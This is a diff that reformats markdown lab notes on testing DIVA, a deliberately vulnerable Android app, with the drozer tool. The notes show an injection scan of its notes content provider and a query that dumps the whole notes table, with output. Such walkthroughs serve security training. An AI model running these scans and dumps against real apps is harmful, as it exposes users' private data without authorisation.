@@ -1,7 +1,12 @@
-### Help information detail about this command ###
-    help scanner.provider.injection
-    help app.provider.query
+# Help information detail about this command #
+    
+```help scanner.provider.injection```
+<br><br>
+```help app.provider.query```
+<br><br><br>
+* **Running scanner.provider.injection for scanning available vulnerable content injection**
 
+```
 dz> run scanner.provider.injection -a jakhar.aseem.diva
 Scanning jakhar.aseem.diva...
 Not Vulnerable:
@@ -15,8 +20,10 @@ Injection in Projection:
 Injection in Selection:
   content://jakhar.aseem.diva.provider.notesprovider/notes/
   content://jakhar.aseem.diva.provider.notesprovider/notes
-  
-  
+```
+
+* **Running app.provider.query for dump all tables field**
+```
 dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/ --projection "*"
 | _id | title    | note                                 |
 | 5   | Exercise | Alternate days running               |
@@ -25,3 +32,4 @@ dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/no
 | 3   | holiday  | Either Goa or Amsterdam              |
 | 2   | home     | Buy toys for baby, Order dinner      |
 | 1   | office   | 10 Meetings. 5 Calls. Lunch with CEO |
+```
